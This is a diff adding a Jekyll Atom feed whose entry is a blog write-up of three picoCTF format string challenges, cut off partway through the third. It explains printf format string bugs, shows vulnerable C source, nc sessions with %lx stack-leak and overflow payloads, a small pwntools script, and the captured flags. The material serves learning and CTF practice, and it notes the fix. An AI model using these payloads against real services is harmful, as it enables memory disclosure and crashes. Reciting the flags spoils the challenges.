@@ -1,0 +1,393 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-15T21:18:19-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jake Mullins</title><subtitle>This is my site where I publish writeups on CTF problems I&apos;ve done and projects I&apos;m working on.
+</subtitle><author><name>Jake Mullins</name></author><entry><title type="html">Week 2 - Format String Attacks from PicoCTF</title><link href="http://localhost:4000/year-of-hacking-0x2-copy" rel="alternate" type="text/html" title="Week 2 - Format String Attacks from PicoCTF" /><published>2024-04-11T00:00:00-06:00</published><updated>2024-04-11T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0x2%20copy</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0x2-copy">&lt;p&gt;This week I took a look at 3 format string challenges in PicoCTF.&lt;/p&gt;
+&lt;h1 id=&quot;format-string-attack-introduction&quot;&gt;Format string attack introduction&lt;/h1&gt;
+&lt;p&gt;In every computer science student’s first introduction to low-level programming in C, they are instructed to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; to display output to the terminal, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fprintf&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dprintf&lt;/code&gt; to write to a file or file descriptor. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; is a high-level function that is defined in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; C API standard, and its most common implementation is in GNU’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;glibc&lt;/code&gt; library, though others exist. The function definition is:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int printf(const char *restrict format, ...);&lt;/code&gt;
+The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. 
+The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...&lt;/code&gt; argument is an arbitrary-length list of arguments to be passed to the format string as inputs.&lt;/p&gt;
+
+&lt;p&gt;Lets look at some examples:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;printf(&quot;%x\n&quot;, 36); // Convert 36 to hex
+printf(&quot;%c\n&quot;, 36); // Print ascii char with value 36
+printf(&quot;%lx\n&quot;, 0x1234567890abcdef); // Print 64-bit hex number 
+printf(&quot;%d\n&quot;, 0x100); // Print 0x100 in decimal
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Security issues can arise when an untrusted data source is given control of that format string. Take this example program:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+int main() {
+    printf(&quot;What&apos;s your name? &quot;);
+    char inputBuf[256];
+    scanf(&quot;%s&quot;, inputBuf);
+    printf(&quot;Your name is:\n&quot;);
+    long int sensitiveItem = 0x1234567890abcdef;
+    printf(inputBuf);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can compile and run this program with&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc demo.c -o demo -fno-stack-protector -z execstack -no-pie; ./demo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Since we’re given control of the format string through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inputBuf&lt;/code&gt; variable, we can try to set our own format designator to expose data on the stack:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;What&apos;s your name? %x
+Your name is:
+1f502a0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What happened was we made the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inputBuf&lt;/code&gt; string equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt;. Normally this would take the value of the next argument and represent it at as a hex string, but since there are no arguments, it then pops the data off the stack. We can use this to print out the state of the stack using a whole bunch of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; format designators:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;What is your name? %lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
+Your name is:
+44a2a0,0,7f7e6a5bbb00,c0,7f7e6a697aa0,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,1234567890abcdef,1,7f7e6a4eb6ca,0,401146,100000000,7fff2b8a4208,7fff2b8a4208,9551d3493ca1e505,0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can see the sensitive data in this mess after that long string of zeroes.&lt;/p&gt;
+
+&lt;p&gt;The point is, processing user input in this way can lead to all kinds vulnerabilities. This risk can be minimized by using:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;printf(&quot;%s&quot;, inputBuf);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Rather than&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;printf(inputBuf);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&quot;format-string-0&quot;&gt;Format String 0&lt;/h1&gt;
+&lt;p&gt;In this challenge, we get access to a port running a C binary, and the source code of the binary:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;signal.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+  
+#define BUFSIZE 32
+#define FLAGSIZE 64
+  
+char flag[FLAGSIZE];
+  
+void sigsegv_handler(int sig) {
+    printf(&quot;\n%s\n&quot;, flag);
+    fflush(stdout);
+    exit(1);
+}
+  
+int on_menu(char *burger, char *menu[], int count) {
+    for (int i = 0; i &amp;lt; count; i++) {
+        if (strcmp(burger, menu[i]) == 0)
+            return 1;
+    }
+    return 0;
+}
+  
+void serve_patrick();
+
+void serve_bob();
+  
+int main(int argc, char **argv){
+    FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+    if (f == NULL) {
+        printf(&quot;%s %s&quot;, &quot;Please create &apos;flag.txt&apos; in this directory with your own debugging flag.\n&quot;);
+        exit(0);
+    }
+  
+    fgets(flag, FLAGSIZE, f);
+    signal(SIGSEGV, sigsegv_handler);
+  
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+  
+    serve_patrick();
+    return 0;
+}
+  
+void serve_patrick() {
+    printf(&quot;%s %s\n%s\n%s %s\n%s&quot;,
+            &quot;Welcome to our newly-opened burger place Pico &apos;n Patty!&quot;,
+            &quot;Can you help the picky customers find their favorite burger?&quot;,
+            &quot;Here comes the first customer Patrick who wants a giant bite.&quot;,
+            &quot;Please choose from the following burgers:&quot;,
+            &quot;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&quot;,
+            &quot;Enter your recommendation: &quot;);
+    fflush(stdout);
+  
+    char choice1[BUFSIZE];
+    scanf(&quot;%s&quot;, choice1);
+    char *menu1[3] = {&quot;Breakf@st_Burger&quot;, &quot;Gr%114d_Cheese&quot;, &quot;Bac0n_D3luxe&quot;};
+  ********  if (!on_menu(choice1, menu1, 3)) {
+        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
+        fflush(stdout);
+    } else {
+        int count = printf(choice1);
+        if (count &amp;gt; 2 * BUFSIZE) {
+            serve_bob();
+        } else {
+            printf(&quot;%s\n%s\n&quot;,
+                    &quot;Patrick is still hungry!&quot;,
+                    &quot;Try to serve him something of larger size!&quot;);
+            fflush(stdout);
+        }
+    }
+}
+  
+void serve_bob() {
+    printf(&quot;\n%s %s\n%s %s\n%s %s\n%s&quot;,
+            &quot;Good job! Patrick is happy!&quot;,
+            &quot;Now can you serve the second customer?&quot;,
+            &quot;Sponge Bob wants something outrageous that would break the shop&quot;,
+            &quot;(better be served quick before the shop owner kicks you out!)&quot;,
+            &quot;Please choose from the following burgers:&quot;,
+            &quot;Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak&quot;,
+            &quot;Enter your recommendation: &quot;);
+    fflush(stdout);
+  
+    char choice2[BUFSIZE];
+    scanf(&quot;%s&quot;, choice2);
+    char *menu2[3] = {&quot;Pe%to_Portobello&quot;, &quot;$outhwest_Burger&quot;, &quot;Cla%sic_Che%s%steak&quot;};
+    if (!on_menu(choice2, menu2, 3)) {
+        printf(&quot;%s&quot;, &quot;There is no such burger yet!\n&quot;);
+        fflush(stdout);
+    } else {
+        printf(choice2);
+        fflush(stdout);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This challenge is pretty easy. We can see that there is a custom function that is called whenever a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt; is thrown. All we have to do is cause a segfault:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jakemull㉿leman-russ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/ctf/pico]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc mimas.picoctf.net 65265
+Welcome to our newly-opened burger place Pico &lt;span class=&quot;s1&quot;&gt;&apos;n Patty! Can you help the picky customers find their favorite burger?
+Here comes the first customer Patrick who wants a giant bite.
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+There is no such burger yet!
+
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We are able to cause the segfault because there is no error handling or input validation, allowing us to dump garbage into the stack until the program pops the garbage into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip&lt;/code&gt; register, sending a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here’s a very simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; python script to do this programmatically&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+  
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&apos;: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  
+&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&apos;}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;format-string-1&quot;&gt;Format String 1&lt;/h1&gt;
+&lt;p&gt;We’re provided with a similar setup to the last challenge, an open port running a C binary with the following source code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+
+int main() {
+  char buf[1024];
+  char secret1[64];
+  char flag[64];
+  char secret2[64];
+  
+  // Read in first secret menu item
+  FILE *fd = fopen(&quot;secret-menu-item-1.txt&quot;, &quot;r&quot;);
+  if (fd == NULL){
+    printf(&quot;&apos;secret-menu-item-1.txt&apos; file not found, aborting.\n&quot;);
+    return 1;
+  }
+  fgets(secret1, 64, fd);
+  // Read in the flag
+  fd = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (fd == NULL){
+    printf(&quot;&apos;flag.txt&apos; file not found, aborting.\n&quot;);
+    return 1;
+  }
+  fgets(flag, 64, fd);
+  // Read in second secret menu item
+  fd = fopen(&quot;secret-menu-item-2.txt&quot;, &quot;r&quot;);
+  if (fd == NULL){
+    printf(&quot;&apos;secret-menu-item-2.txt&apos; file not found, aborting.\n&quot;);
+    return 1;
+  }
+  fgets(secret2, 64, fd);
+  
+  printf(&quot;Give me your order and I&apos;ll read it back to you:\n&quot;);
+  fflush(stdout);
+  scanf(&quot;%1024s&quot;, buf);
+  printf(&quot;Here&apos;s your order: &quot;);
+  printf(buf);
+  printf(&quot;\n&quot;);
+  fflush(stdout);
+  
+  printf(&quot;Bye!\n&quot;);
+  fflush(stdout);
+  
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Towards the bottom, there’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; that repeats user inputted data, making it vulnerable to a format string attack to expose the state of the stack. Luckily, the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; are loaded into the stack earlier in execution.&lt;/p&gt;
+
+&lt;p&gt;The most basic definition of a string is any amount of characters in memory that end with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;. The format designator is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt;. I first tried to feed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; characters to try and expose any cstrings in the stacks, but it didn’t yield any useful information:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jakemull㉿leman-russ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/ctf/pico/format-string-1]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc mimas.picoctf.net 62076
+Give me your order and I&lt;span class=&quot;s1&quot;&gt;&apos;ll read it back to you:
+%s%s%s%s
+Here&apos;&lt;/span&gt;s your order: Here&lt;span class=&quot;s1&quot;&gt;&apos;s your order: (null)(null)
+Bye!
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I tried this with a wide range of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; designators, and nothing happened. Turns out, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%s&lt;/code&gt; symbol resolves a pointer on the stack, and then reads it as a string, rather than pulling a string from the stack. We can get around this by pulling the raw bytes from the stack using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt;, which prints out the hex representation of the next 64-bit number on the stack. We can get a complete representation of the state of the stack by feeding a truly egregious amount of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; symbols into the program:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(jakemull㉿leman-russ)-[~/ctf/pico/format-string-1]
+└─$ nc mimas.picoctf.net 62076
+Give me your order and I&apos;ll read it back to you:
+%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
+Here&apos;s your order: 402118,0,79beef7a5a00,0,1592880,a347834,7ffc5f170cb0,79beef596e60,79beef7bb4d0,1,7ffc5f170d80,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531,7,79beef7bd8d8,2300000007,206e693374307250,a336c797453,9,79beef7cede9,79beef59f098,79beef7bb4d0,0,7ffc5f170d90,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
+Bye!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can take the stack and plug it in to cyberchef for easy processing. By removing anything that doesn’t look like a hex representation of printable characters, we get the 5 hex numbers: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Turning the hex representation to printable characters, we get the string: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{FTCocip5_14m1n44x4_31y71e_g41f_}8108e1&lt;/code&gt;. Because of endianness shenanigans, we need to reverse each 64 bit number, resulting in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1e8018}_f14g_e17y13_4x44n1m41_5picoCTF{&lt;/code&gt;, then reverse the order of each number, resulting in the final flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;format-string-2&quot;&gt;Format String 2&lt;/h1&gt;
+&lt;p&gt;The source code for this challenge reveals that all we need to do is set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sus&lt;/code&gt; variable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x67616c66&lt;/code&gt; which is the byte representation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;  
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21737573&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You don&apos;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%1024s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here&apos;s your input: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67616c66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I have NO clue how you did that, you must be a wizard. Here you go...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  
